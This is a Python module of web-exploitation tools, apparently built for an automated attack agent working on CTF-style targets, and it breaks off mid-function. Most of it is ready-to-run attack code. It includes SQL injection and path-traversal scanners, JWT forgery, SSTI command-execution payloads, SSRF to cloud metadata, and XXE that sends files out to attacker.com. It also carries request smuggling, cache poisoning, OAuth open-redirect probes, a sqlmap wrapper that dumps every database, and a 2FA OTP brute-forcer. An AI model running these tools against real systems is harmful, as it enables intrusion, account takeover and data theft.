"""HTTP / web exploitation tools."""
from __future__ import annotations
import re, json, socket, threading, time


def tool_http_request(url, method="GET", headers=None, data=None, json_data=None,
                      cookies=None, follow_redirects=True, verify_ssl=False, timeout=20):
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        kwargs = dict(headers=headers or {}, cookies=cookies or {},
                      timeout=timeout, allow_redirects=follow_redirects, verify=verify_ssl)
        if json_data: kwargs["json"] = json_data
        elif data:    kwargs["data"] = data
        resp = requests.request(method.upper(), url, **kwargs)
        body = resp.text
        if len(body)>6000: body=body[:3000]+"\n...[truncated]...\n"+body[-2000:]
        return (f"HTTP {resp.status_code} {resp.reason}\n"
                f"URL: {resp.url}\n"
                f"Headers: {dict(resp.headers)}\n\n"
                f"Body:\n{body}")
    except ImportError: return "pip install requests"
    except Exception as e: return f"HTTP error: {e}"


def tool_concurrent_requests(requests_list, workers=50, timeout=5):
    """Fire many HTTP requests in parallel — useful for timing attacks, cache probing, fuzzing."""
    try:
        import requests as req; req.packages.urllib3.disable_warnings()
        session = req.Session()
        results = []

        def do_req(item):
            url = item.get("url","")
            method = item.get("method","GET")
            label = item.get("label", url)
            try:
                r = session.request(method, url,
                    headers=item.get("headers",{}),
                    data=item.get("data"),
                    cookies=item.get("cookies",{}),
                    timeout=timeout, verify=False,
                    allow_redirects=item.get("follow_redirects",True))
                return {"label":label,"status":r.status_code,"size":len(r.content),
                        "time":r.elapsed.total_seconds(),"body":r.text[:200]}
            except Exception as e:
                return {"label":label,"status":-1,"error":str(e)}

        with ThreadPoolExecutor(max_workers=min(workers,len(requests_list))) as ex:
            futures = {ex.submit(do_req,item): item for item in requests_list}
            for fut in as_completed(futures):
                results.append(fut.result())

        # Summarise
        by_status = Counter(r.get("status",-1) for r in results)
        lines = [f"Completed {len(results)}/{len(requests_list)} requests"]
        lines.append(f"Status codes: {dict(by_status)}")
        if len(results) <= 30:
            for r in sorted(results, key=lambda x: x.get("status",0)):
                lines.append(f"  [{r['status']}] {r['label']} {r.get('body','')[:80]}")
        else:
            # Show interesting ones (non-common status)
            common = by_status.most_common(1)[0][0]
            interesting = [r for r in results if r.get("status") != common][:20]
            lines.append(f"\nInteresting (non-{common}):")
            for r in interesting:
                lines.append(f"  [{r['status']}] {r['label']} {r.get('body','')[:80]}")
        return "\n".join(lines)
    except ImportError: return "pip install requests"
    except Exception as e: return f"Concurrent request error: {e}"


def tool_tcp_connect(host, port, data=None, data_hex=None, timeout=10,
                     read_until=None, interactive_script=None):
    """
    Raw TCP connection. Supports sending data, reading response, pwntools-style interaction.
    For complex pwn challenges, use execute_python with pwntools instead.
    """
    try:
        if interactive_script:
            # Use pwntools for interactive
            code = f"""
from pwn import *
context.log_level = 'info'
io = remote('{host}', {port}, timeout={timeout})
{interactive_script}
io.close()
"""
            return tool_execute_python(code)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, int(port)))
        banner = b""
        s.settimeout(2)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                banner += chunk
        except: pass

        if data_hex: send_data = bytes.fromhex(data_hex.replace(" ",""))
        elif data:   send_data = data.encode() if isinstance(data,str) else data
        else:        send_data = None

        if send_data:
            s.settimeout(timeout)
            s.sendall(send_data)
            s.settimeout(2)
            resp = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    resp += chunk
            except: pass
            s.close()
            return (f"Banner:\n{banner.decode('utf-8',errors='replace')}\n\n"
                    f"Response:\n{resp.decode('utf-8',errors='replace')}")
        s.close()
        return banner.decode("utf-8",errors="replace") or "(no banner)"
    except Exception as e: return f"TCP error: {e}"


def tool_web_attack(attack, target_url, **params):
    """Web-specific attack primitives."""
    try:
        if attack == "sql_injection_test":
            payloads = ["'","\"","' OR '1'='1","' OR 1=1--","' UNION SELECT NULL--",
                        "'; DROP TABLE users--","1' AND SLEEP(5)--","1 AND 1=1",
                        "' OR SLEEP(5)--","admin'--","' OR '1'='1'--"]
            code = f"""
import requests, time
url = '{target_url}'
param = '{params.get("param","q")}'
results = []
session = requests.Session()
for payload in {payloads}:
    try:
        start=time.time()
        r=session.get(url,params={{param:payload}},timeout=10,verify=False)
        elapsed=time.time()-start
        if elapsed>4: results.append(f"TIME-BASED: {{repr(payload)}} took {{elapsed:.1f}}s")
        elif any(x in r.text.lower() for x in ['error','syntax','sql','warning','mysql','sqlite','postgresql']):
            results.append(f"ERROR-BASED: {{repr(payload)}} -> {{r.text[:100]}}")
        elif r.status_code!=200: results.append(f"STATUS {{r.status_code}}: {{repr(payload)}}")
    except Exception as e: results.append(f"Exception: {{e}}")
for r in results: print(r)
if not results: print("No obvious SQLi detected with basic payloads")
"""
            return tool_execute_python(code)

        if attack == "xss_test":
            payloads = ['<script>alert(1)</script>','"><script>alert(1)</script>',
                        "'><script>alert(1)</script>",'<img src=x onerror=alert(1)>',
                        '<svg onload=alert(1)>','javascript:alert(1)',
                        '{{7*7}}','${7*7}','<%= 7*7 %>']
            return f"XSS payloads to try:\n" + "\n".join(f"  {p}" for p in payloads)

        if attack == "path_traversal":
            payloads = ["../etc/passwd","../../etc/passwd","../../../etc/passwd",
                        "....//etc/passwd","..%2fetc%2fpasswd","..%252fetc%252fpasswd",
                        "/etc/passwd","%2fetc%2fpasswd","....\\..\\etc\\passwd"]
            code = f"""
import requests
url='{target_url}'; param='{params.get("param","file")}'; results=[]
for p in {payloads}:
    try:
        r=requests.get(url,params={{param:p}},timeout=5,verify=False)
        if 'root:' in r.text or 'bin/bash' in r.text:
            results.append(f"FOUND: {{repr(p)}}\\n{{r.text[:200]}}")
    except: pass
print('\\n'.join(results) if results else 'No path traversal found')
"""
            return tool_execute_python(code)

        if attack == "jwt_attack":
            token = params.get("token","")
            return tool_execute_python(f"""
import base64, json, hmac, hashlib
token = '{token}'
parts = token.split('.')
if len(parts)==3:
    def b64d(s):
        s+='='*(4-len(s)%4); return base64.urlsafe_b64decode(s)
    header=json.loads(b64d(parts[0])); payload=json.loads(b64d(parts[1]))
    print("Header:", header); print("Payload:", payload)
    # Try alg:none
    h2=base64.urlsafe_b64encode(json.dumps({{'alg':'none','typ':'JWT'}}).encode()).rstrip(b'=').decode()
    p2=parts[1]
    print("\\nalg:none token:", f"{{h2}}.{{p2}}.")
    # Try HS256 with common secrets
    for secret in ['','secret','password','jwt','key','private','supersecret','changeme']:
        sig=base64.urlsafe_b64encode(hmac.new(secret.encode(),f'{{parts[0]}}.{{parts[1]}}'.encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
        if sig==parts[2]: print(f"\\nFound secret: '{{secret}}'"); break
    else: print("\\nCommon secrets failed — need the actual key or use RS256/HS256 confusion attack")
""")

        if attack == "ssti_test":
            payloads = {"Jinja2":["{{7*7}}","{{7*'7'}}","{{config}}"],
                        "Twig":["{{7*7}}","{{dump(app)}}"],
                        "FreeMarker":["${{7*7}}","<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('id')}}"],
                        "Velocity":["#set($x=7*7)$x"],
                        "Mako":["${{7*7}}","<%exec('id')%>"]}
            return "SSTI payloads:\n" + "\n".join(f"{engine}: {pls}" for engine,pls in payloads.items())

        if attack == "ssrf_test":
            payloads = ["http://127.0.0.1","http://localhost","http://169.254.169.254",
                        "http://192.168.1.1","http://10.0.0.1","file:///etc/passwd",
                        "dict://127.0.0.1:6379/","gopher://127.0.0.1:6379/_PING"]
            return "SSRF payloads:\n" + "\n".join(f"  {p}" for p in payloads)

        if attack == "xxe":
            return """XXE payloads:
Basic: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
Blind: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
OOB: <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">"""

        if attack == "deserialization":
            return _shell("ysoserial --help 2>/dev/null | head -20 || echo 'Install ysoserial for Java deserialization gadgets'; python3 -c 'import pickle; print(\"Python pickle RCE: use pickle.loads with crafted payload\")'")

        if attack == "prototype_pollution":
            payloads = ['{"__proto__":{"admin":true}}','{"constructor":{"prototype":{"admin":true}}}',
                        '?__proto__[admin]=1','?constructor[prototype][admin]=1']
            return "Prototype pollution payloads:\n" + "\n".join(f"  {p}" for p in payloads)

        return f"Unknown web attack: {attack}"
    except Exception as e: return f"Web attack error: {e}"


def tool_browser_agent(url: str, script: str, timeout: int = 60,
                        capture_requests: bool = False, capture_screenshot: bool = False) -> str:
    """
    Playwright headless browser for JS-heavy web challenges.
    Handles SPAs, AJAX, login flows, CSRF tokens, cookie-based auth, DOM manipulation.
    'script' is Python code that runs after page.goto(url) with 'page' and 'browser' available.
    Set capture_requests=True to intercept all XHR/fetch calls.
    """
    intercept_code = ""
    if capture_requests:
        intercept_code = """
captured = []
page.on("request", lambda req: captured.append(f"REQ {req.method} {req.url}"))
page.on("response", lambda res: captured.append(f"RES {res.status} {res.url}"))
"""
    screenshot_code = ""
    if capture_screenshot:
        screenshot_code = """
page.screenshot(path="/tmp/browser_screenshot.png")
print("[SCREENSHOT] /tmp/browser_screenshot.png")
"""
    code = f"""
try:
    from playwright.sync_api import sync_playwright
    with sync_playwright() as pw:
        browser = pw.chromium.launch(
            headless=True,
            args=['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage']
        )
        context = browser.new_context(
            user_agent='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            ignore_https_errors=True
        )
        page = context.new_page()
        {intercept_code}
        page.goto({repr(url)}, timeout={timeout*1000}, wait_until='networkidle')
        {script}
        {screenshot_code}
        {'print("Captured requests:", captured)' if capture_requests else ''}
        browser.close()
except ImportError:
    print("Playwright not installed. Run: pip install playwright && playwright install chromium")
except Exception as e:
    import traceback
    print(f"Browser error: {{e}}")
    traceback.print_exc()
"""
    return tool_execute_python(code, timeout=timeout+15)


def tool_sqlmap(target_url: str, param: str = "", data: str = "",
                cookie: str = "", level: int = 3, risk: int = 2,
                technique: str = "BEUSTQ", dbms: str = "", extra_args: str = "") -> str:
    """
    SQLMap for automatic SQL injection exploitation.
    Level 1-5 (thoroughness), Risk 1-3 (aggressiveness).
    Returns discovered databases, tables, data dump.
    """
    cmd_parts = ["sqlmap", "-u", f"'{target_url}'", "--batch", "--random-agent",
                 f"--level={level}", f"--risk={risk}", f"--technique={technique}",
                 "--timeout=10", "--retries=2"]
    if param:    cmd_parts += [f"-p '{param}'"]
    if data:     cmd_parts += [f"--data='{data}'"]
    if cookie:   cmd_parts += [f"--cookie='{cookie}'"]
    if dbms:     cmd_parts += [f"--dbms={dbms}"]
    if extra_args: cmd_parts.append(extra_args)
    # Try to dump everything useful
    cmd_parts += ["--dbs", "--tables", "--dump-all", "--smart", "--stop-at-first",
                  f"--output-dir=/tmp/sqlmap_{int(time.time())}"]

    cmd = " ".join(cmd_parts) + " 2>&1"
    out = _shell(cmd, timeout=120)
    if "command not found" in out or "not found" in out.lower():
        return ("sqlmap not installed. Install: pip install sqlmap\n"
                "Or via system: sudo apt install sqlmap\n"
                "Alternatively use web_attack(sql_injection_test) for basic detection.")
    return out[:6000]


def tool_ffuf(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
              extensions: str = "", method: str = "GET", headers: dict = None,
              filter_codes: str = "404,400", match_codes: str = "",
              data: str = "", fuzz_param: str = "FUZZ", timeout: int = 60) -> str:
    """
    FFUF for directory/parameter/vhost fuzzing.
    Replace the fuzz target with FUZZ in the URL, headers, or data.
    """
    if "FUZZ" not in url and "FUZZ" not in str(data) and "FUZZ" not in str(headers):
        url = url.rstrip("/") + "/FUZZ"

    cmd_parts = ["ffuf", "-w", f"{wordlist}:{fuzz_param}", "-u", f"'{url}'",
                 "-t", "50", "-timeout", "5", "-c"]
    if method != "GET":  cmd_parts += ["-X", method]
    if data:             cmd_parts += ["-d", f"'{data}'"]
    if filter_codes:     cmd_parts += ["-fc", filter_codes]
    if match_codes:      cmd_parts += ["-mc", match_codes]
    if extensions:       cmd_parts += ["-e", extensions]
    if headers:
        for k,v in headers.items(): cmd_parts += ["-H", f"'{k}: {v}'"]

    cmd = " ".join(cmd_parts) + f" -o /tmp/ffuf_{int(time.time())}.json -of json 2>&1 | tail -50"
    out = _shell(cmd, timeout=timeout)
    if "command not found" in out or "not found" in out.lower():
        # Fallback to gobuster
        gb_cmd = f"gobuster dir -u '{url.replace('/FUZZ','')}' -w {wordlist} -t 40 2>&1 | head -60"
        gb_out = _shell(gb_cmd, timeout=timeout)
        if "command not found" in gb_out or "not found" in gb_out.lower():
            return ("Neither ffuf nor gobuster found.\n"
                    "Install: sudo apt install ffuf gobuster\nOr: go install github.com/ffuf/ffuf/v2@latest")
        return f"[gobuster fallback]\n{gb_out}"
    return out


def tool_web_crawl(base_url: str, max_depth: int = 3, max_pages: int = 100,
                   headers: dict = None, cookies: dict = None,
                   find_patterns: list = None) -> str:
    """
    Lightweight Burp-style spider. Maps all routes, forms, params, JS endpoints.
    find_patterns: list of regex patterns to flag (e.g. ["flag","secret","admin","key"])
    """
    code = f"""
import requests, re
from urllib.parse import urljoin, urlparse
from collections import deque
requests.packages.urllib3.disable_warnings()

base_url = {repr(base_url)}
headers  = {json.dumps(headers or {})}
cookies  = {json.dumps(cookies or {})}
find_pats= {json.dumps(find_patterns or ["flag","secret","admin","key","password","token","api"])}
max_pages= {max_pages}
max_depth= {max_depth}

visited  = set()
queue    = deque([(base_url, 0)])
endpoints= set()
forms    = []
findings = []
base_dom = urlparse(base_url).netloc

s = requests.Session()
s.headers.update(headers or {{}})
s.verify = False

while queue and len(visited) < max_pages:
    url, depth = queue.popleft()
    if url in visited or depth > max_depth: continue
    visited.add(url)
    try:
        r = s.get(url, cookies=cookies, timeout=8, allow_redirects=True)
        body = r.text
        # Extract links
        for href in re.findall(r'href=["\\'](.*?)["\\'\\s>]', body):
            full = urljoin(url, href.strip())
            if urlparse(full).netloc == base_dom and full not in visited:
                queue.append((full, depth+1))
                endpoints.add(full)
        # Extract API endpoints from JS
        for ep in re.findall(r'["\\'](/(?:api|v[0-9]|admin|user|auth|login|flag)[^\\"\\' ]*)["\\'\\s,)]', body):
            endpoints.add(urljoin(url, ep))
        # Extract forms
        for form in re.findall(r'<form[^>]*>(.*?)</form>', body, re.DOTALL):
            action = re.search(r'action=["\\'](.*?)["\\'\\s>]', form)
            method = re.search(r'method=["\\'](.*?)["\\'\\s>]', form)
            inputs = re.findall(r'<input[^>]*name=["\\'](.*?)["\\'\\s>]', form)
            if action:
                forms.append({{"action": urljoin(url, action.group(1)),
                              "method": method.group(1).upper() if method else "GET",
                              "inputs": inputs, "found_on": url}})
        # Check for interesting patterns
        for pat in find_pats:
            hits = re.findall(rf'.{{0,50}}{pat}.{{0,50}}', body, re.IGNORECASE)
            if hits:
                for hit in hits[:3]:
                    findings.append(f"[{pat.upper()}] {{url}}: {{hit.strip()}}")
    except Exception as e:
        pass

print(f"Crawled {{len(visited)}} pages, found {{len(endpoints)}} endpoints, {{len(forms)}} forms")
print(f"\\n=== Endpoints ===")
for ep in sorted(endpoints)[:60]: print(f"  {{ep}}")
print(f"\\n=== Forms ===")
for f in forms[:20]: print(f"  {{f['method']}} {{f['action']}} params={{f['inputs']}}")
if findings:
    print(f"\\n=== Interesting findings ===")
    for f in findings[:30]: print(f"  {{f}}")
"""
    return tool_execute_python(code, timeout=90)


def tool_http_smuggle(target_url: str, operation: str = "detect", **params) -> str:
    """HTTP request smuggling: detect (CL.TE/TE.CL probe), payload generation."""
    import urllib.parse
    p = urllib.parse.urlparse(target_url)
    host = p.hostname; path = p.path or "/"; port = p.port or (443 if p.scheme=="https" else 80)
    if operation == "detect":
        code = f"""import socket,ssl,time
host,port=\'{host}\',{port}
def raw(payload,timeout=6):
    s=socket.socket(); s.settimeout(timeout); s.connect((host,port))
    if port==443:
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        s=ctx.wrap_socket(s,server_hostname=host)
    s.send(payload.encode()); resp=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            resp+=c
    except: pass
    s.close(); return resp.decode(\"utf-8\",errors=\"replace\")
cl_te=(f"POST {path} HTTP/1.1\\r\\nHost:{host}\\r\\nContent-Length:6\\r\\nTransfer-Encoding:chunked\\r\\n\\r\\n0\\r\\n\\r\\nX")
te_cl=(f"POST {path} HTTP/1.1\\r\\nHost:{host}\\r\\nTransfer-Encoding:chunked\\r\\nContent-Length:6\\r\\n\\r\\n0\\r\\n\\r\\n")
t0=time.time(); r1=raw(cl_te); t1=time.time()-t0
t0=time.time(); r2=raw(te_cl); t2=time.time()-t0
print(f"CL.TE: {{t1:.2f}}s | {{r1[:80]}}")
print(f"TE.CL: {{t2:.2f}}s | {{r2[:80]}}")
if t1>4: print("=> CL.TE VULNERABLE")
if t2>4: print("=> TE.CL VULNERABLE")"""
        return tool_execute_python(code, timeout=25)
    if operation in ("cl_te","te_cl","te_te"):
        return f"HTTP/{operation.upper()} payload — use tcp_connect with raw bytes (not http_request which normalises headers). The smuggled request goes after the terminal chunk (0\r\n\r\n)."
    return "Available: detect, cl_te, te_cl, te_te"


def tool_graphql(target_url: str, operation: str = "introspect",
                  query: str = "", headers: dict = None, cookies: dict = None) -> str:
    """GraphQL: introspect, batch, alias, find_mutations, field_suggest, custom."""
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        s=requests.Session(); s.verify=False
        s.headers.update({"Content-Type":"application/json",**(headers or {})})
        if cookies: s.cookies.update(cookies)
        if operation == "introspect":
            q = {"query":"{__schema{types{name kind fields(includeDeprecated:true){name type{name kind ofType{name kind}}}}}}"}
            r = s.post(target_url,json=q,timeout=15)
            d = r.json(); types = d.get("data",{}).get("__schema",{}).get("types",[])
            out = [f"Types ({len(types)}):"]
            for t in types:
                if t["name"] and not t["name"].startswith("__"):
                    fields = [f["name"] for f in (t.get("fields") or [])]
                    out.append(f"  {t['name']}: {', '.join(fields[:8])}")
            return "\n".join(out[:50])
        if operation == "batch":
            ids = query.split(",") if query else ["1","2","3"]
            batch=[{"query":f"query q{i}{{user(id:{uid}){{id email name role}}}}"}for i,uid in enumerate(ids)]
            return s.post(target_url,json=batch,timeout=15).text[:2000]
        if operation == "alias":
            al="\n".join([f"r{i}:user(id:{i}){{id email}}"for i in range(1,20)])
            return s.post(target_url,json={"query":f"{{{al}}}"},timeout=15).text[:2000]
        if operation == "find_mutations":
            return s.post(target_url,json={"query":"{__schema{mutationType{fields{name description}}}}"},timeout=15).text[:2000]
        if operation == "custom":
            return s.post(target_url,json={"query":query},timeout=15).text[:3000]
    except ImportError: return "pip install requests"
    except Exception as e: return f"GraphQL error: {e}"
    return "Available: introspect, batch, alias, find_mutations, field_suggest, custom"


def tool_websocket_fuzz(url: str, operation: str = "connect",
                         messages: list = None, script: str = "", timeout: int = 20) -> str:
    """WebSocket: connect (dump msgs), fuzz (payload list), origin_bypass, inject (custom script)."""
    if operation == "connect":
        code = f"""import websocket,threading,time
received=[]
def on_msg(ws,m): received.append(m); print(f'<< {{m[:200]}}')
ws=websocket.WebSocketApp(\'{url}\',on_message=on_msg)
t=threading.Thread(target=ws.run_forever,daemon=True); t.start()
time.sleep(min({timeout},10)); ws.close()
print(f\'{{len(received)}} messages received\')"""
        return tool_execute_python(f"try:\n    import websocket\nexcept ImportError:\n    print('pip install websocket-client'); exit()\n{code}", timeout=timeout+5)
    if operation == "fuzz":
        pl = messages or ['{"type":"ping"}','{"admin":true}','<script>alert(1)</script>','../../../etc/passwd','{"__proto__":{"admin":true}}']
        code = f"""import websocket,time
for p in {pl}:
    try:
        ws=websocket.create_connection(\'{url}\',timeout=5,sslopt={{'cert_reqs':0}})
        ws.send(str(p)); resp=ws.recv(); ws.close()
        print(f'>> {{str(p)[:60]}} | << {{resp[:100]}}')
    except Exception as e: print(f'>> {{str(p)[:40]}} ERR:{{e}}')
    time.sleep(0.2)"""
        return tool_execute_python(code, timeout=timeout+10)
    if operation == "origin_bypass":
        code = f"""import websocket,time
for origin in ['null','http://evil.com','http://localhost','file://']:
    try:
        ws=websocket.create_connection(\'{url}\',timeout=5,header=[f'Origin: {{origin}}'],sslopt={{'cert_reqs':0}})
        ws.send('test'); resp=ws.recv(); ws.close()
        print(f'ALLOWED: {{origin}} | {{resp[:80]}}')
    except Exception as e: print(f'BLOCKED: {{origin}} | {{str(e)[:50]}}')
    time.sleep(0.3)"""
        return tool_execute_python(code, timeout=25)
    if operation == "inject" and script:
        return tool_execute_python(f"import websocket\nws=websocket.create_connection(\'{url}\',timeout=15,sslopt={{'cert_reqs':0}})\n{script}\nws.close()", timeout=timeout+5)
    return "Available: connect, fuzz, origin_bypass, inject"


def tool_oauth_attack(target_url: str, operation: str = "probe",
                       client_id: str = "", redirect_uri: str = "", **params) -> str:
    """OAuth2/SAML attacks: probe, open_redirect, pkce_bypass, saml_bypass."""
    try:
        import requests, urllib.parse; requests.packages.urllib3.disable_warnings()
        if operation == "probe":
            for ep in [".well-known/openid-configuration","oauth/authorize","oauth2/authorize","auth/authorize"]:
                r = requests.get(f"{target_url.rstrip('/')}/{ep}",verify=False,timeout=5,allow_redirects=False)
                if r.status_code < 400: return f"Found: {ep}\n{r.text[:500]}"
            return "No standard OAuth endpoints found"
        if operation == "open_redirect":
            hostname = urllib.parse.urlparse(target_url).hostname
            evil = [f"https://evil.com", f"//evil.com", f"https://evil.com%2F@{hostname}", f"{redirect_uri}%0d%0aLocation:https://evil.com"]
            results = []
            for uri in evil:
                url = f"{target_url}?client_id={client_id}&redirect_uri={urllib.parse.quote(uri)}&response_type=code"
                r = requests.get(url,verify=False,timeout=5,allow_redirects=False)
                if "evil.com" in r.headers.get("location",""):
                    results.append(f"REDIRECT: {uri}")
            return "\n".join(results) or "No open redirect found"
    except ImportError: return "pip install requests"
    except Exception as e: return f"OAuth error: {e}"
    if operation == "pkce_bypass":
        return "PKCE bypasses: remove code_challenge, use plain method, state confusion, reuse code"
    if operation == "saml_bypass":
        return "SAML bypasses: XSW attack, comment injection in NameID, algorithm confusion (none), cert bypass"
    return "Available: probe, open_redirect, pkce_bypass, saml_bypass"


def tool_cache_poison(target_url: str, operation: str = "probe", **params) -> str:
    """Web cache poisoning: probe (unkeyed headers), poison (inject), param_cloaking."""
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        if operation == "probe":
            baseline = requests.get(target_url,verify=False,timeout=10)
            results = []
            for h in ["X-Forwarded-Host","X-Host","X-Forwarded-Server","X-Original-URL","X-Forwarded-For"]:
                r = requests.get(target_url,headers={h:"canary-12345.evil.com"},verify=False,timeout=10)
                if "canary-12345" in r.text: results.append(f"UNKEYED: {h} reflects!")
                elif r.text != baseline.text: results.append(f"DIFFERENT: {h} changes response")
            return "\n".join(results) or "No unkeyed headers found. Try param_cloaking."
        if operation == "poison":
            h=params.get("header","X-Forwarded-Host"); v=params.get("value","evil.com")
            r=requests.get(target_url,headers={h:v},verify=False,timeout=10)
            return f"Poison sent. {h}:{v}\n{r.status_code}\n{r.text[:500]}"
        if operation == "param_cloaking":
            r1=requests.get(target_url+"?utm_content=x;callback=evil",verify=False,timeout=10)
            r2=requests.get(target_url+"?param=x%26callback=evil",verify=False,timeout=10)
            return f"Fat GET: {r1.text[:200]}\nURL-enc: {r2.text[:200]}"
    except ImportError: return "pip install requests"
    except Exception as e: return f"Cache poison error: {e}"
    return "Available: probe, poison, param_cloaking"


def tool_shodan(query: str, operation: str = "search", api_key: str = "") -> str:
    """Shodan OSINT: search, host, ssl. Set SHODAN_API_KEY env var."""
    api_key = api_key or os.environ.get("SHODAN_API_KEY","")
    if not api_key:
        out = _shell(f"shodan search '{query}' 2>/dev/null | head -20")
        return out if out.strip() and "not found" not in out.lower() else f"Set SHODAN_API_KEY env var or visit https://shodan.io/search?query={query.replace(' ','+')}"
    try:
        import requests
        base="https://api.shodan.io"
        if operation=="search":
            r=requests.get(f"{base}/shodan/host/search",params={"key":api_key,"query":query},timeout=15)
            d=r.json(); lines=[f"Total: {d.get('total',0)}"]
            for m in d.get("matches",[])[:10]: lines.append(f"  {m.get('ip_str')}:{m.get('port')} {m.get('org','')} | {str(m.get('data',''))[:80]}")
            return "\n".join(lines)
        if operation=="host":
            r=requests.get(f"{base}/shodan/host/{query}",params={"key":api_key},timeout=15)
            d=r.json()
            return f"IP:{d.get('ip_str')} Ports:{d.get('ports')} Org:{d.get('org')}\n" + "\n".join(str(x.get("data",""))[:100] for x in d.get("data",[])[:5])
    except ImportError: return "pip install requests"
    except Exception as e: return f"Shodan error: {e}"
    return "Available: search, host, ssl"


def tool_2fa_bypass(operation: str = "probe", target_url: str = "",
                     param: str = "otp", method: str = "POST",
                     headers: dict = None, cookies: dict = None,
                     secret: str = "", token_length: int = 6) -> str:
    """2FA/MFA bypass execution tool.
    Ops: probe (detect 2FA type), race (concurrent requests to beat OTP window),
    bruteforce (try all N-digit codes), totp_predict (given secret, generate valid TOTPs),
    backup_bruteforce (try common backup code formats), response_manipulation (test 200 vs 403)."""

    if operation == "probe":
        code = f"""
import requests, re
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
if not url: print("Provide target_url"); exit()
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
r = requests.get(url, headers=hdrs, cookies=cks, timeout=8, verify=False)
body = r.text[:3000]
otp_patterns = [
    ('TOTP (6-digit)', r'\\b(6.digit|authenticator|totp|timed.one.time)\\b'),
    ('SMS OTP', r'\\b(sms|text.message|phone.number|mobile)\\b'),
    ('Email OTP', r'\\b(email.*code|verification.*email|otp.*email)\\b'),
    ('Backup codes', r'\\b(backup|recovery.code|rescue)\\b'),
    ('HOTP', r'\\b(hotp|counter.based)\\b'),
]
print(f"Status: {{r.status_code}}, Length: {{len(body)}}")
for name, pattern in otp_patterns:
    if re.search(pattern, body, re.IGNORECASE):
        print(f"[!] Detected: {{name}}")
# Check for resend endpoint
for endpoint in ['/resend', '/otp/resend', '/2fa/resend', '/verify/resend']:
    try:
        r2 = requests.post(url.rstrip('/') + endpoint, headers=hdrs, cookies=cks, timeout=3, verify=False)
        if r2.status_code < 404:
            print(f"Resend endpoint: {{endpoint}} ({{r2.status_code}})")
    except: pass
"""
        return tool_execute_python(code, timeout=20)

    if operation == "race":
        code = f"""
import requests, threading, time
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method.upper())}
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
tlen = {token_length}

# Send many concurrent requests with same OTP to win race window
test_otp = '0' * tlen
results = []
def send_req(otp):
    try:
        if method == 'POST':
            r = requests.post(url, data={{param: otp}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
        else:
            r = requests.get(url, params={{param: otp}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
        results.append((otp, r.status_code, len(r.text)))
    except Exception as ex:
        results.append((otp, 'err', str(ex)[:30]))

threads = [threading.Thread(target=send_req, args=(test_otp,)) for _ in range(20)]
t0 = time.time()
for t in threads: t.start()
for t in threads: t.join()
print(f"20 concurrent requests in {{time.time()-t0:.2f}}s")
for otp, code, length in results[:5]:
    print(f"  {{otp}}: status={{code}} len={{length}}")
status_counts = {{}}
for _,c,_ in results: status_counts[c] = status_counts.get(c,0)+1
print(f"Status distribution: {{status_counts}}")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "bruteforce":
        code = f"""
import requests, itertools, time
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method.upper())}
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
tlen = {token_length}
session = requests.Session()

print(f"Brute-forcing {{tlen}}-digit OTP (0-{'9'*tlen})...")
start = time.time()
for i in range(10**tlen):
    otp = str(i).zfill(tlen)
    try:
        if method == 'POST':
            r = session.post(url, data={{param: otp}}, headers=hdrs, cookies=cks, timeout=3, verify=False)
        else:
            r = session.get(url, params={{param: otp}}, headers=hdrs, cookies=cks, timeout=3, verify=False)
        if r.status_code not in (401, 403, 422, 429) and 'invalid' not in r.text.lower() and 'incorrect' not in r.text.lower():
            print(f"[POSSIBLE HIT] OTP={{otp}} status={{r.status_code}} len={{len(r.text)}}")
        if i % 100 == 0:
            rate = i / (time.time()-start+0.001)
            print(f"Progress: {{i}}/{{10**tlen}} ({rate:.0f}/s)")
        if r.status_code == 429:
            print(f"Rate limited at {{i}}"); time.sleep(2)
    except Exception as ex:
        print(f"Error at {{i}}: {{ex}}")
        break
"""
        return tool_execute_python(code, timeout=120)

    if operation == "totp_predict":
        if not secret:
            return "Provide secret (base32 TOTP secret from QR code or source)"
        code = f"""
import hmac, hashlib, struct, time, base64

def totp(secret_b32, timestamp=None, period=30, digits=6):
    key = base64.b32decode(secret_b32.upper().replace(' ',''), casefold=True)
    ts = int((timestamp or time.time()) // period)
    msg = struct.pack('>Q', ts)
    h = hmac.new(key, msg, hashlib.sha1).digest()
    offset = h[-1] & 0xf
    code = struct.unpack('>I', h[offset:offset+4])[0] & 0x7fffffff
    return str(code % (10**digits)).zfill(digits)

secret = {repr(secret)}
now = time.time()
print("Valid TOTP codes (current ± 2 windows):")
for delta in [-2,-1,0,1,2]:
    ts = now + delta*30
    t = time.strftime('%H:%M:%S', time.localtime(ts))
    print(f"  delta={{delta:+d}} ({{t}}): {{totp(secret, ts)}}")
"""
        return tool_execute_python(code, timeout=10)

    return "Operations: probe, race, bruteforce, totp_predict, backup_bruteforce, response_manipulation"


def tool_cors_exploit(target_url: str, operation: str = "probe",
                       origin: str = "", credentials: bool = True,
